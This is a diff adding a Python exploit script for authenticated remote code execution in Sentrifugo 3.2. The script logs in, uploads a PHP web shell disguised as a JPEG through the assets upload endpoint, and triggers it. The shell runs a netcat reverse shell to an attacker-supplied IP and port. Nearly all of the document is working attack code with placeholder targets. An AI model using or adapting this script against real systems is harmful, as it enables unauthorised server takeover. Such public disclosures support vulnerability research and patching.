@@ -1,0 +1,60 @@
+# Exploit Title: Sentrifugo 3.2 - 'assets' Remote Code Execution (Authenticated)
+# Google Dork: N/A
+# Date: 2020.10.06
+# Exploit Author: Fatih Çelik
+# Vendor Homepage: https://sourceforge.net/projects/sentrifugo/
+# Software Link: https://sourceforge.net/projects/sentrifugo/
+# Blog: https://fatihhcelik.blogspot.com/2020/10/sentrifugo-version-32-rce-authenticated_6.html
+# Version: 3.2
+# Tested on: Kali Linux 2020.2
+# CVE : N/A
+
+import requests
+from bs4 import BeautifulSoup
+from ast import literal_eval
+
+'''
+You should change the below hardcoded inputs to get a reverse shell.
+'''
+
+login_url = "http://XXX.XXX.XXX.XXX/sentrifugo/index.php/index/loginpopupsave"
+upload_url = "http://XXX.XXX.XXX.XXX/sentrifugo/index.php/assets/assets/uploadsave"
+call_shell = "http://XXX.XXX.XXX.XXX/sentrifugo/public/uploads/assets_images_temp/"
+username = "xxxx"
+password = "xxxx"
+
+attacker_ip = "XXX.XXX.XXX.XXX"
+listener_port = "4444"
+
+# Set proxy for debugging purposes
+
+proxy = {"http": "http://XXX.XXX.XXX.XXX:8080"}
+
+# Log in to the system
+
+session = requests.Session()
+request = session.get(login_url)
+body = {"username":username,"password":password}
+# session.post(login_url, data=body, proxies=proxy) 
+session.post(login_url, data=body) # Send a request without proxy
+print("Logged in to the application..")
+
+# Upload the PHP shell
+files = [
+    ('myfile', 
+        ('shell.php',
+        '<?php system(\'nc.traditional {} {} -e /bin/bash\'); ?>'.format(attacker_ip,listener_port),
+        'image/jpeg')
+    )
+]
+# r = session.post(upload_url, files=files, proxies=proxy)
+r = session.post(upload_url, files=files) # Send a request without proxy
+response = r.content
+dict_str = response.decode("UTF-8")
+response = literal_eval(dict_str) # Convert bytes to dictionary
+filename = response["filedata"]["new_name"]
+url = call_shell + filename
+print("PHP file is uploaded --> {}".format(url))
+
+# Trigger the shell
+session.get(url)
